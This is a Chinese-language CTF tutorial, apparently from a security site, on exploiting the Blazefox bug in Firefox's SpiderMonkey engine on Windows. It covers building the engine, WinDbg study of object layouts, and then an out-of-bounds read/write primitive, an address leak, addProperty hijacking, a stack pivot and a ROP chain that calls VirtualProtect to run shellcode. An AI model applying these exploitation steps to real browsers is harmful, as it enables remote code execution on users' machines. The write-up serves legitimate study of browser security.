# Firefox Pwn 0x00

阅读量 **871498**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-02-27 15:30:49

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t019bbbb543218752c5.jpg)

## 概述

前一阵在学习浏览器PWN，花了几天把这篇[文章](https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation)啃完了，其中的几个exp也都调试了下，学到很多。

原文十分详细地描述了把18年的ctf题 [Blazefox](https://ctftime.org/task/6000)
移植到Windows平台利用的过程，总共写了三个exp脚本（basic.js, kaizen.js,
ifrit.js)，从一开始硬编码的rop链到后面动态解析地址并利用JIT携带rop gadget，循序渐进。

这篇文章梳理了一下spidermonkey基础知识，并讲讲basic.js中的利用方法。

## 环境搭建

> <https://github.com/0vercl0k/blazefox/releases> 这里有编译好的，懒得编译的同学可以自取。

###  clone

首先要把gecko代码拉下来，由于是教程是写于18年的，可能现在代码改动比较多，拉最新分支的代码patch会打不上去，于是只好全部clone下来。

    
    
    git clone https://github.com/mozilla/gecko-dev.git
    

这里代码量有点大（5.6g），国内的网络状态估计不太容易拉下来，git clone
貌似也不支持断点续传，中途连接中断就很伤。我的做法是到国外vps上去clone，打包压缩之后下载到本地。

###  patch

有了代码之后接下来就是打patch，由于最新分支patch打不上去，于是我试着切到patch中标注的日期所对应的commit，最后切到be1b849fa264成功打上了patch。（过程曲折。。）

    
    
    # 打印某个日期范围内的commit信息
    git log --after="2018-04-01 00:00" --before="2018-04-10 23:59"
    git checkout -f be1b849fa264
    cd gecko-devjs
    
    git apply c:xxxblaze.patch
    # git apply --reject --whitespace=fix mypath.patch
    # git checkout -f master
    

###  build

坑爹的visual studio， 这里折腾了一天。详细记一下

安装
[MozillaBuildSetup-3.2.exe](https://ftp.mozilla.org/pub/mozilla/libraries/win32/MozillaBuildSetup-3.2.exe)
，在C:mozilla-build下面找到start-shell.bat双击打开是一个mingw32的终端，之后就在这里面操作。

到这个链接下<https://docs.microsoft.com/en-us/visualstudio/productinfo/installing-an-earlier-release-of-vs2017> ，找到15.6.7版本的链接点开下载。注意！google
vs2017搜到的是最新版本的vs2017，最新版本编译是会有问题的。

  
下图是安装最新版本vs2017或者vs2019，后面编译时的报错：

“This version (19.16.27034) of the MSVC compiler is not supported due to
compiler bugs.”,

“You must install Visual C++ 2017 Update 6 in order to build”

根据[bugzilla里面的说法](https://bugzilla.mozilla.org/show_bug.cgi?id=1472148)，这里的Update
6指的就是15.6版本.

![](https://p5.ssl.qhimg.com/t019d241239a239a49f.png)

安装完之后，配置、编译、运行

    
    
    gecko-dev/js/src$ autoconf-2.13
    gecko-dev/js/src$ mkdir build.asserts
    gecko-dev/js/src$ cd build.asserts
    gecko-dev/js/src/build.asserts$ ../configure --host=x86_64-pc-mingw32 --target=x86_64-pc-mingw32 --enable-debug # vs版本不对的话这里会报错
    
    gecko-dev/js/src/build.asserts$ mozmake -j2
    # 到这里编译完成，产出js.exe，此时运行js.exe，会报错缺少dll
    gecko-dev/js/src/build.asserts$ cp ./mozglue/build/mozglue.dll       ./config/external/nspr/pr/nspr4.dll  ./js/src/
    gecko-dev/js/src/build.asserts$./js/src/js.exe # done！
    js> 1+1
    2
    js>
    

## 数据表示

js引擎中都会有一些用来debug的函数，和 JavaScriptCore 中的describe一样， SpiderMonkey中也有类似的：

  * objectAddress 打印object地址
  * dumpObject 打印object信息

打开windbg，attach到js.exe，按g运行，设置断点的方式是找一个很少被用到的函数，比如 `Math.atan2` 。

Math.atan2的函数签名如下：

    
    
    bool js::math_atan2(JSContext* cx, unsigned argc, Value* vp)
    

windows x64汇编中，函数传参使用前三个寄存器依次是：RCX, RDX, R8D

    
    
    dqs @r8 l@rdx+2 # dqs每行打印8bytes长度， 第一个参数是起始地址，第二个参数Lxx是几行
    

在math_atan2处断下后argc+2(rdx)是参数个数，vp(r8)指向参数列表，这里个数是argc+2的原因是保留了两个参数（返回值和this指针）

所以`dqs [@r8](https://github.com/r8 "@r8") l[@rdx](https://github.com/rdx
"@rdx")+2`打印出函数的三个参数，第一个是返回值，第二个是this指针，第三个就是调用时传入的参数。

接下来通过下面的测试脚本来看看不同数据类型在内存中的表示：

    
    
    'use strict';
    
    const Address = Math.atan2;
    
    const A = 0x1337;
    Address(A);
    
    const B = 13.37;
    Address(B);
    
    const C = [1, 2, 3, 4, 5];
    Address(C);
    

###  整数 浮点数

![](https://p5.ssl.qhimg.com/t01fa70681a1376fe88.png)

上图是在`Address(A)`处断下，可以看出整数A(1377)在内存中的表示是fff88000`00001337

    
    
    0:000> dqs @r8 l@rdx+2
    0000028f`87ab8198  fffe028f`877a9700
    0000028f`87ab81a0  fffe028f`87780180
    0000028f`87ab81a8  402abd70`a3d70a3d Value* vp
    
    0:000> .formats 402abd70`a3d70a3d
    Evaluate expression:
      Hex:     402abd70`a3d70a3d
      Double:  13.37
    

相应的，浮点数B(13.37)在内存中的表示为402abd70`a3d70a3d，

对象C在内存中的表示为fffe028f`87790400,

经过分析， `JS::Value` 的高17位是tag保存类型信息，低47位是value保存值信息。（17+47=64）

tag表示如何解读后面的value，当tag是整数、布尔这些类型的时候，value是立即数；当tag是object的时候，value是指针。

    
    
    enum JSValueType : uint8_t
    {
        JSVAL_TYPE_DOUBLE              = 0x00,
        JSVAL_TYPE_INT32               = 0x01,
        JSVAL_TYPE_BOOLEAN             = 0x02,
        JSVAL_TYPE_UNDEFINED           = 0x03,
        JSVAL_TYPE_NULL                = 0x04,
        JSVAL_TYPE_MAGIC               = 0x05,
        JSVAL_TYPE_STRING              = 0x06,
        JSVAL_TYPE_SYMBOL              = 0x07,
        JSVAL_TYPE_PRIVATE_GCTHING     = 0x08,
        JSVAL_TYPE_OBJECT              = 0x0c,
        // These never appear in a jsval; they are only provided as an out-of-band
        // value.
        JSVAL_TYPE_UNKNOWN             = 0x20,
        JSVAL_TYPE_MISSING             = 0x21
    };
    
    JS_ENUM_HEADER(JSValueTag, uint32_t)
    {
        JSVAL_TAG_MAX_DOUBLE           = 0x1FFF0,
        JSVAL_TAG_INT32        = JSVAL_TAG_MAX_DOUBLE | JSVAL_TYPE_INT32, //int的tag是0x1ff1
        JSVAL_TAG_UNDEFINED            = JSVAL_TAG_MAX_DOUBLE | JSVAL_TYPE_UNDEFINED,
        JSVAL_TAG_NULL                 = JSVAL_TAG_MAX_DOUBLE | JSVAL_TYPE_NULL,
        JSVAL_TAG_BOOLEAN              = JSVAL_TAG_MAX_DOUBLE | JSVAL_TYPE_BOOLEAN,
        JSVAL_TAG_MAGIC                = JSVAL_TAG_MAX_DOUBLE | JSVAL_TYPE_MAGIC,
        JSVAL_TAG_STRING               = JSVAL_TAG_MAX_DOUBLE | JSVAL_TYPE_STRING,
        JSVAL_TAG_SYMBOL               = JSVAL_TAG_MAX_DOUBLE | JSVAL_TYPE_SYMBOL,
        JSVAL_TAG_PRIVATE_GCTHING      = JSVAL_TAG_MAX_DOUBLE | JSVAL_TYPE_PRIVATE_GCTHING,
        JSVAL_TAG_OBJECT               = JSVAL_TAG_MAX_DOUBLE | JSVAL_TYPE_OBJECT
    } JS_ENUM_FOOTER(JSValueTag);
    

从上面的定义中可以看出，int类型的tag是0x1ff1，object类型的tag是0x1ffc

验证如下：

    
    
    >>> v = 0xfff8800000001337
    >>> hex(v >> 47)
    '0x1fff1'
    >>> hex(v & ((2**47) - 1))
    '0x1337'
    >>> 
    >>> obj = 0xfffe028f87790400
    >>> hex(obj>>47)
    '0x1fffc'
    >>> hex(obj & ((2**47)-1))
    '0x28f87790400'
    >>>
    

###  数组

    
    
    # const C = [1, 2, 3, 4, 5];
    0:000> dqs @r8 l@rdx+2
    0000027a`bf5b8198  fffe027a`bf2a9480
    0000027a`bf5b81a0  fffe027a`bf280140
    0000027a`bf5b81a8  fffe027a`bf2900a0 👈
    
    0:000> dqs 27a`bf2900a0
    0000027a`bf2900a0  0000027a`bf27ab20
    0000027a`bf2900a8  0000027a`bf2997e8
    0000027a`bf2900b0  00000000`00000000
    0000027a`bf2900b8  0000027a`bf2900d0 数据指针👇
    0000027a`bf2900c0  00000005`00000000
    0000027a`bf2900c8  00000005`00000006
    0000027a`bf2900d0  fff88000`00000001 <= 数组数据开始
    0000027a`bf2900d8  fff88000`00000002
    0000027a`bf2900e0  fff88000`00000003
    0000027a`bf2900e8  fff88000`00000004
    0000027a`bf2900f0  fff88000`00000005
    0000027a`bf2900f8  4f4f4f4f`4f4f4f4f
    

打印数组的信息，可以发现数据整齐排布在后面，也可以看到疑似数据长度、指针这些东西。通过查看结构体信息可以验证我们的猜想。

    
    
    0:000> dt JSObject
       +0x000 group_           : js::GCPtr<js::ObjectGroup *>
       +0x008 shapeOrExpando_  : Ptr64 Void
    
    0:000> dt js::NativeObject
       +0x000 group_           : js::GCPtr<js::ObjectGroup *>
       +0x008 shapeOrExpando_  : Ptr64 Void
       +0x010 slots_           : Ptr64 js::HeapSlot
       +0x018 elements_        : Ptr64 js::HeapSlot
    
    
    0:000> dt js::ArrayObject
       +0x000 group_           : js::GCPtr<js::ObjectGroup *>
       +0x008 shapeOrExpando_  : Ptr64 Void
       +0x010 slots_           : Ptr64 js::HeapSlot
       +0x018 elements_        : Ptr64 js::HeapSlot
    

继承链： js::ArrayObject <= js::NativeObject <= JS::ShapedObject<= JSObject

###  对象

> 推荐视频：<https://mathiasbynens.be/notes/shapes-ics>

我们主要后面关注property(属性)和value(值)，shape描述对象 properties 的信息，在shapeOrExpando_中表示。

后面用来调试的代码：

    
    
    'use strict';
    
    const Address = Math.atan2;
    
    const A = {
        foo : 1337,
        blah : 'doar-e'
    };
    Address(A);
    
    const B = {
        foo : 1338,
        blah : 'sup'
    };
    Address(B);
    
    const C = {
        foo : 1338,
        blah : 'sup'
    };
    C.another = true; // C增加了一个prop
    Address(C);
    

**prop**

    
    
    # address(A)处断下
    0:000> ?? vp[2].asBits_ 
    unsigned int64 0xfffe01fc`e637e1c0
    
    0:000> dt js::NativeObject 1fc`e637e1c0 shapeOrExpando_ # 可以这样连着写
       +0x008 shapeOrExpando_ : 0x000001fc`e63ae880 Void
    
    0:000> ?? ((js::shape*)0x000001fc`e63ae880)
    class js::Shape * 0x000001fc`e63ae880
       +0x000 base_            : js::GCPtr<js::BaseShape *>
       +0x008 propid_          : js::PreBarriered<jsid>  # 存储prop信息
       +0x010 immutableFlags   : 0x2000001 #低位存slot number 
       +0x014 attrs            : 0x1 ''
       +0x015 mutableFlags     : 0 ''
       +0x018 parent           : js::GCPtr<js::Shape *>
       +0x020 kids             : js::KidsPointer
       +0x020 listp            : (null) 
    
    0:000> ?? ((js::shape*)0x000001fc`e63ae880)->propid_.value
    struct jsid
       +0x000 asBits           : 0x000001fc`e63a7e20
    
    0:000> ?? (char*)((JSString*)0x000001fc`e63a7e20)->d.inlineStorageLatin1
    char * 0x000001fc`e63a7e28
     "blah"
    

shape objects 直接通过链表连接(.parent)

    
    
    0:000> ?? ((js::shape*)0x000001fc`e63ae880)->parent.value
    class js::Shape * 0x000001fc`e63ae858
       +0x000 base_            : js::GCPtr<js::BaseShape *>
       +0x008 propid_          : js::PreBarriered<jsid>
       +0x010 immutableFlags   : 0x2000000
       +0x014 attrs            : 0x1 ''
       +0x015 mutableFlags     : 0x2 ''
       +0x018 parent           : js::GCPtr<js::Shape *>
       +0x020 kids             : js::KidsPointer
       +0x020 listp            : 0x000001fc`e63ae880 js::GCPtr<js::Shape *>
    
    0:000> ?? ((js::shape*)0x000001fc`e63ae880)->parent.value->propid_.value
    struct jsid
       +0x000 asBits           : 0x000001fc`e633d700
    
    0:000> ?? (char*)((JSString*)0x000001fc`e633d700)->d.inlineStorageLatin1
    char * 0x000001fc`e633d708
     "foo"
    

B和A的property信息是相同的，所以他们使用相同的shape: `0x000001fc e63ae880`

    
    
    # address(B)处断下
    0:000> ?? vp[2].asBits_
    unsigned int64 0xfffe01fc`e637e1f0
    
    0:000> dt js::NativeObject 1fc`e637e1f0 shapeOrExpando_
       +0x008 shapeOrExpando_ : 0x000001fc`e63ae880 Void
    

C相比A和B增加了一个property，来看看他有什么变化，

    
    
    # address(C)处断下
    0:000> ?? vp[2].asBits_
    union JS::Value
       +0x000 asBits_          : 0xfffe01e7`c247e1c0
    
    0:000> dt js::NativeObject 1fc`e637e1f0 shapeOrExpando_
       +0x008 shapeOrExpando_ : 0x000001fc`e63b10d8 Void
    
    0:000> ?? ((js::shape*)0x000001fc`e63b10d8)
    class js::Shape * 0x000001fc`e63b10d8
       +0x000 base_            : js::GCPtr<js::BaseShape *>
       +0x008 propid_          : js::PreBarriered<jsid>
       +0x010 immutableFlags   : 0x2000002
       +0x014 attrs            : 0x1 ''
       +0x015 mutableFlags     : 0 ''
       +0x018 parent           : js::GCPtr<js::Shape *>
       +0x020 kids             : js::KidsPointer
       +0x020 listp            : (null) 
    
    0:000> ?? ((js::shape*)0x000001fc`e63b10d8)->propid_.value
    struct jsid
       +0x000 asBits           : 0x000001fc`e63a7e60
    
    0:000> ?? (char*)((JSString*)0x000001fc`e63a7e60)->d.inlineStorageLatin1
    char * 0x000001fc`e63a7e68
     "another"
    
    0:000> ?? ((js::shape*)0x000001fc`e63b10d8)->parent.value
    class js::Shape * 0x000001fc`e63ae880 # 这个是A、B的shape
    

C使用一个新的shape对象，他的parent指针指向A、B的shape对象，形成链表结构

图示如下：

![](https://p5.ssl.qhimg.com/t011e2cd804afc5c3ed.png)

**value**

value存在elements_中，各个value依次排列。 通过shape对象immutableFlags中的值作为索引把prop和value联系起来。

    
    
    0:000> ?? vp[2].asBits_
    unsigned int64 0xfffe01fc`e637e1c0  
    0:000> ?? vp[2].asBits_
    unsigned int64 0xfffe01fc`e637e1c0
    0:000> dt js::NativeObject 1fce637e1c0
       +0x000 group_           : js::GCPtr<js::ObjectGroup *>
       +0x008 shapeOrExpando_  : 0x000001fc`e63ae880 Void
       +0x010 slots_           : (null) 
       +0x018 elements_        : 0x00007ff7`7707dac0 js::HeapSlot
    
    0:000> dqs 1fc`e637e1c0
    000001fc`e637e1c0  000001fc`e637a520
    000001fc`e637e1c8  000001fc`e63ae880
    000001fc`e637e1d0  00000000`00000000
    000001fc`e637e1d8  00007ff7`7707dac0 js!emptyElementsHeader+0x10
    000001fc`e637e1e0  fff88000`00000539 <- 1337
    000001fc`e637e1e8  fffb01fc`e63a7e40 <- "doar-e"
    0:000> ?? (char*)((JSString*)0x1fce63a7e40)->d.inlineStorageLatin1
    char * 0x000001fc`e63a7e48
     "doar-e"
    

![](https://p3.ssl.qhimg.com/t01e8f034881275b724.png)

###  更多类型

按照上面的方法可以把感兴趣的类型都看一看，这里举一些例子。

windbg打开可执行文件js.exe，参数填写`-i` ,在交互模式下调试

    
    
    js> const br = Math.atan2;
    js> const od = objectAddress;
    js> ar=new Array(1,2,3,4)
    [1, 2, 3, 4]
    js> u8a = new Uint8Array(16)
    ({0:0, 1:0, 2:0, 3:0, 4:0, 5:0, 6:0, 7:0, 8:0, 9:0, 10:0, 11:0, 12:0, 13:0, 14:0, 15:0})
    js> u32a = new Uint32Array(16)
    ({0:0, 1:0, 2:0, 3:0, 4:0, 5:0, 6:0, 7:0, 8:0, 9:0, 10:0, 11:0, 12:0, 13:0, 14:0, 15:0})
    js> ab = new ArrayBuffer(100)
    ({})
    js> od(ar)
    "00000246ABA01B00"
    js> od(u8a)
    "00000246ABA01B60"
    js> od(u32a)
    "00000246ABA01BC0"
    js> od(ab)
    "00000246ABB94080"
    js>
    
    
    
    0:001> dqs 00000246ABA01B00 # ar=new Array(1,2,3,4)
    00000246`aba01b00  00000246`abb7acd0 # group??
    00000246`aba01b08  00000246`abb997e8 # shapes
    00000246`aba01b10  00000000`00000000 # slot
    00000246`aba01b18  00000246`aba01b30 # 数据指针 element
    00000246`aba01b20  00000004`00000000 # ?
    00000246`aba01b28  00000004`00000006 # ?
    00000246`aba01b30  fff88000`00000001 # 数据
    00000246`aba01b38  fff88000`00000002
    00000246`aba01b40  fff88000`00000003
    00000246`aba01b48  fff88000`00000004
    00000246`aba01b50  2f2f2f2f`2f2f2f2f
    00000246`aba01b58  2f2f2f2f`2f2f2f2f
    00000246`aba01b60  00000246`abb7ae50
    00000246`aba01b68  00000246`abbb3038
    00000246`aba01b70  00000000`00000000
    00000246`aba01b78  00007ff7`10eedac0 js!emptyElementsHeader+0x10
    
    0:001> ?? ( js::ArrayObject * )0x0000246ABA01B00 
    class js::ArrayObject * 0x00000246`aba01b00
       +0x000 group_           : js::GCPtr<js::ObjectGroup *>
       +0x008 shapeOrExpando_  : 0x00000246`abb997e8 Void
       +0x010 slots_           : (null) 
       +0x018 elements_        : 0x00000246`aba01b30 js::HeapSlot
       =00007ff7`10ebed88 class_           : js::Class
    
    
    
    0:001> dqs 00000246ABA01B60   # u8a = new Uint8Array(16)
    00000246`aba01b60  00000246`abb7ae50 # group
    00000246`aba01b68  00000246`abbb3038 # shape
    00000246`aba01b70  00000000`00000000 # slot
    00000246`aba01b78  00007ff7`10eedac0 js!emptyElementsHeader+0x10
    00000246`aba01b80  fffa0000`00000000 # BUFFER_SLOT
    00000246`aba01b88  fff88000`00000010 # 长度 LENGTH_SLOT
    00000246`aba01b90  fff88000`00000000 # BYTEOFFSET_SLOT
    00000246`aba01b98  00000246`aba01ba0 #数据指针 DATA_SLOT
    00000246`aba01ba0  00000000`00000000 #数据 Inline data
    00000246`aba01ba8  00000000`00000000
    00000246`aba01bb0  2f2f2f2f`2f2f2f2f
    00000246`aba01bb8  2f2f2f2f`2f2f2f2f
    00000246`aba01bc0  00000246`abb7af10
    00000246`aba01bc8  00000246`abbb3178
    00000246`aba01bd0  00000000`00000000
    00000246`aba01bd8  00007ff7`10eedac0 js!emptyElementsHeader+0x10
    0:001> ?? (js::ArrayBufferViewObject *) 0x0000246ABA01B60
    class js::ArrayBufferViewObject * 0x00000246`aba01b60
       +0x000 group_           : js::GCPtr<js::ObjectGroup *>
       +0x008 shapeOrExpando_  : 0x00000246`abbb3038 Void
       +0x010 slots_           : (null) 
       +0x018 elements_        : 0x00007ff7`10eedac0 js::HeapSlot
    
    0:001> dqs 00000246ABA01BC0  # u32a = new Uint32Array(16)
    00000246`aba01bc0  00000246`abb7af10
    00000246`aba01bc8  00000246`abbb3178
    00000246`aba01bd0  00000000`00000000
    00000246`aba01bd8  00007ff7`10eedac0 js!emptyElementsHeader+0x10
    00000246`aba01be0  fffa0000`00000000
    00000246`aba01be8  fff88000`00000010
    00000246`aba01bf0  fff88000`00000000
    00000246`aba01bf8  00000246`aba01c00
    00000246`aba01c00  00000000`00000000
    00000246`aba01c08  00000000`00000000
    00000246`aba01c10  00000000`00000000
    00000246`aba01c18  00000000`00000000
    00000246`aba01c20  00000000`00000000
    00000246`aba01c28  00000000`00000000
    00000246`aba01c30  00000000`00000000
    00000246`aba01c38  00000000`00000000
    0:001> dqs 00000246ABB94080  # ab = new ArrayBuffer(100)
    00000246`abb94080  00000246`abb7afa0
    00000246`abb94088  00000246`abbb3380
    00000246`abb94090  00000000`00000000
    00000246`abb94098  00007ff7`10eedac0 js!emptyElementsHeader+0x10
    00000246`abb940a0  00000123`55f81020 # 数据指针（要移位）
    00000246`abb940a8  fff88000`00000064 # 长度
    00000246`abb940b0  fffa0000`00000000 # first view??
    00000246`abb940b8  fff88000`00000008 # flags
    00000246`abb940c0  4f4f4f4f`4f4f4f4f
    00000246`abb940c8  4f4f4f4f`4f4f4f4f
    00000246`abb940d0  4f4f4f4f`4f4f4f4f
    00000246`abb940d8  4f4f4f4f`4f4f4f4f
    00000246`abb940e0  4f4f4f4f`4f4f4f4f
    00000246`abb940e8  4f4f4f4f`4f4f4f4f
    00000246`abb940f0  4f4f4f4f`4f4f4f4f
    00000246`abb940f8  4f4f4f4f`4f4f4f4f
    0:001> ?? ( js::ArrayBufferObject * )0x0000246ABB94080 
    class js::ArrayBufferObject * 0x00000246`abb94080
       +0x000 group_           : js::GCPtr<js::ObjectGroup *>
       +0x008 shapeOrExpando_  : 0x00000246`abbb3380 Void
       +0x010 slots_           : (null) 
       +0x018 elements_        : 0x00007ff7`10eedac0 js::HeapSlot
       =00007ff7`10ee1cc0 class_           : js::Class
       =00007ff7`10ee1cf0 protoClass_      : js::Class
    
    0:001> ? 00000123`55f81020 <<2
    Evaluate expression: 5005111214208 = 0000048d`57e04080
    0:001> ? 00000123`55f81020 <<1
    Evaluate expression: 2502555607104 = 00000246`abf02040
    0:001> dqs 00000246`abf02040
    00000246`abf02040  00000000`00000000
    00000246`abf02048  00000000`00000000
    00000246`abf02050  00000000`00000000
    00000246`abf02058  00000000`00000000
    00000246`abf02060  00000000`00000000
    00000246`abf02068  00000000`00000000
    00000246`abf02070  00000000`00000000
    00000246`abf02078  00000000`00000000
    00000246`abf02080  00000000`00000000
    00000246`abf02088  00000000`00000000
    00000246`abf02090  00000000`00000000
    00000246`abf02098  00000000`00000000
    00000246`abf020a0  00000000`00000000
    00000246`abf020a8  00000000`00000000
    00000246`abf020b0  00000000`00000000
    00000246`abf020b8  00000000`00000000
    

## 利用

###  漏洞

patch中给Array增加了一个函数blaze，此函数把Array的长度设成420。这样“造”出来一个越界访问漏洞。

利用思路是在Array后面放置Uint8Array，通过越界访问Uint8Array来做泄露（读element）和任意地址读写（读写数据指针和数据长度）。下面是Uint8Array的内存布局：

    
    
    0:001> dqs 00000246ABA01B60   # u8a = new Uint8Array(16)
    00000246`aba01b60  00000246`abb7ae50 # group
    00000246`aba01b68  00000246`abbb3038 # shape
    00000246`aba01b70  00000000`00000000 # slot
    00000246`aba01b78  00007ff7`10eedac0 js!emptyElementsHeader+0x10
    00000246`aba01b80  fffa0000`00000000 # BUFFER_SLOT
    00000246`aba01b88  fff88000`00000010 # 长度 LENGTH_SLOT
    00000246`aba01b90  fff88000`00000000 # BYTEOFFSET_SLOT
    00000246`aba01b98  00000246`aba01ba0 #数据指针 DATA_SLOT
    00000246`aba01ba0  00000000`00000000 #数据 Inline data
    00000246`aba01ba8  00000000`00000000
    00000246`aba01bb0  2f2f2f2f`2f2f2f2f
    

![](https://p5.ssl.qhimg.com/t0142075f65d4bde964.png)

###  构建读写原语

这里来测试一下，

    
    
    js> a=new Array(1,2,3,4)
    [1, 2, 3, 4]
    js> b=new Uint8Array(8)
    ({0:0, 1:0, 2:0, 3:0, 4:0, 5:0, 6:0, 7:0})
    js> objectAddress(a)
    "0000023E69201B00"
    js> objectAddress(b)
    "0000023E69201B60"
    js> a.blaze()==undefined // 触发漏洞
    false
    js> a.length
    420
    

可以看出a和b在内存中是相邻的，

![](https://p2.ssl.qhimg.com/t010528ffd49ef44bd4.png)

算出合适的偏移就能通过a修改b的length和ptr

    
    
    js> a[11]=16  // offset 11 修改长度
    16
    js> b.length
    16
    js> load('int64.js')
    js> load('utils.js')
    js> a[13]=new Int64('0x23e69201b30').asDouble() // offset 13 修改指针
    1.2188969734197e-311
    js> b[0]
    1
    
    js> obj_to_leak={a:1}
    ({a:1})
    js> a[14]=obj_to_leak // offset 14 泄露对象地址
    ({a:1})
    js> objectAddress(obj_to_leak)
    "0000023E6937E430"
    js> b.slice(0,8)
    ({0:48, 1:228, 2:55, 3:105, 4:62, 5:2, 6:254, 7:255})
    js> Int64.fromJSValue(b.slice(0, 8)).toString(16)
    "0x0000023e6937e430"
    js>
    

看上去没什么问题，后面来调试exp。

## basic.js

有了读写原语，后面需要劫持执行流。使用的方法是找到并覆盖某个object的函数指针，再调用这个函数来触发。

好多层，大概长这样：

    
    
    js::NativeObject 
        +0x000 group_
            +0x000 value js!js::ObjectGroup
                +0x000 clasp_ js!js::Class
                    +0x010 cOps js!js:ClassOps
                        +0x000 addProperty
                        +0x008 delProperty
    

结果发现addProperty这里是没有写权限的，只能往上找可以写的地方然后把他之后的结构都伪造出来，找到的目标是js::ObjectGroup那里，所以伪造它的整个clasp_结构就好了
。

在获得改写addProperty的能力之后，需要思考如何做stack pivot，接下来就是要找到一个合适的rop gadget，0vercl0k找了一个：

    
    
    00007fff`b8c4fda3 ff33            push    qword ptr [rbx]
    [...]
    00007fff`b8c4fda8 5c              pop     rsp
    00007fff`b8bf500d 4883c440        add     rsp,40h
    [...]
    00007fff`b8bf5016 c3              ret
    

注意在调用到addProperty时，rbx是 `JSObject` 的指针。

即对于下面的Target来说：

    
    
    const Target = new Uint8Array(90);
    ...
    Target.im_falling_and_i_cant_turn_back = 1;
    

这个gadget把执行流转移到Target的buffer空间中，在此处放置其他gadget，进入下一阶段。

###  ROP chain

现在需要一个ROP链，basic.js中实现了一种可能：

  * gadget #1， 覆盖addProperty指针（前面说的）

    
    
    // ** gadget 0  **
    // 0:000> u 00007ff7`60ce5d80
    // js!js::irregexp::RegExpLookahead::Accept [c:usersovermozilla-centraljssrcirregexpregexpast.cpp @ 40]:
    // 00007ff7`60ce5d80 488b02          mov     rax,qword ptr [rdx]
    // 00007ff7`60ce5d83 4c8bca          mov     r9,rdx
    // 00007ff7`60ce5d86 488bd1          mov     rdx,rcx
    // 00007ff7`60ce5d89 498bc9          mov     rcx,r9
    // 00007ff7`60ce5d8c 48ff6040        jmp     qword ptr [rax+40h]
    // 0:000> ? 00007ff7`60ce5d80 - js
    // Evaluate expression: 17325440 = 00000000`01085d80
    //
    

这是开始的第一步， `Target.im_falling_and_i_cant_turn_back =
1`会调用addProperty，此时rdx和rbx中存的是指向Target地址的指针。因为Target的类型是Uint8Array，参考前文中类型结构可知gadget0的作用是跳转到Target的Inline
data处。

  * gadget #2， 存放在Target的inline data开始

    
    
    //
    // 0:000> u ntdll+000bfda2 l10
    // ntdll!TpSimpleTryPost+0x5aeb2:
    // 00007fff`b8c4fda2 f5              cmc
    // 00007fff`b8c4fda3 ff33            push    qword ptr [rbx]  <= 关键语句1
    // 00007fff`b8c4fda5 db4889          fisttp  dword ptr [rax-77h]
    // 00007fff`b8c4fda8 5c              pop     rsp <= 关键语句2
    // 00007fff`b8c4fda9 2470            and     al,70h
    // 00007fff`b8c4fdab 8b7c2434        mov     edi,dword ptr [rsp+34h]
    // 00007fff`b8c4fdaf 85ff            test    edi,edi
    // 00007fff`b8c4fdb1 0f884a52faff    js      ntdll!TpSimpleTryPost+0x111 (00007fff`b8bf5001) <= 跳到下面
    //
    // 0:000> u 00007fff`b8bf5001
    // ntdll!TpSimpleTryPost+0x111:
    // 00007fff`b8bf5001 8bc7            mov     eax,edi
    // 00007fff`b8bf5003 488b5c2468      mov     rbx,qword ptr [rsp+68h]
    // 00007fff`b8bf5008 488b742478      mov     rsi,qword ptr [rsp+78h]
    // 00007fff`b8bf500d 4883c440        add     rsp,40h
    // 00007fff`b8bf5011 415f            pop     r15
    // 00007fff`b8bf5013 415e            pop     r14
    // 00007fff`b8bf5015 5f              pop     rdi
    // 00007fff`b8bf5016 c3              ret <= 关键语句3
    

此时rbx是指向Target地址的指针，target地址入栈后又被弹出到rsp中，后面rsp增加0x40，又出栈三次，最后ret。所以运行完gadget
#2之后，rip指向Target偏移0x58即Target[0x18]处

  * gadget #3， 存放在Target的inline data开始0x18处

    
    
    //
    // 0x140079e55: pop rsp ; ret  ;  <= 0x18
    // BigRopChain address   <= 0x20
    

跳转到BigRopChain处

  * gadget #4， BigRopChain

    
    
    const BigRopChain = [
        // 0x1400cc4ec: pop rcx ; ret  ;  (43 found)
        Add(JSBase, 0xcc4ec),
        ShellcodeAddress,
    
        // 0x1400731da: pop rdx ; ret  ;  (20 found)
        Add(JSBase, 0x731da),
        new Int64(Shellcode.length),
    
        // 0x14056c302: pop r8 ; ret  ;  (8 found)
        Add(JSBase, 0x56c302),
        PAGE_EXECUTE_READWRITE,
    
        VirtualProtect,
        // 0x1413f1d09: add rsp, 0x10 ; pop r14 ; pop r12 ; pop rbp ; ret  ;  (1 found)
        Add(JSBase, 0x13f1d09),
        new Int64('0x1111111111111111'),
        new Int64('0x2222222222222222'),
        new Int64('0x3333333333333333'),
        new Int64('0x4444444444444444'),
        ShellcodeAddress,
    
        // 0x1400e26fd: jmp rbp ;  (30 found) 
        Add(JSBase, 0xe26fd)
    ];
    

这是最后一个阶段，BigRopChain被分配在另一个大的Uint8Array中。使用VirtualProtect给shellcode区域加上执行权限，之后跳转到shellcode执行。

## 参考链接

<https://developer.mozilla.org/en-US/docs/Mozilla/Developer_guide/Build_Instructions/Windows_Prerequisites>

<https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation>

<https://github.com/0vercl0k/blazefox/blob/master/exploits/basic.js>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Slash** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/198939](/post/id/198939)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [浏览器安全](/tag/浏览器安全)
  * [firefox](/tag/firefox)
  * [spidermonkey](/tag/spidermonkey)

 **+1** __3赞

 __收藏

![](https://p4.ssl.qhimg.com/t0123e976b16531d055.jpg) Slash

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

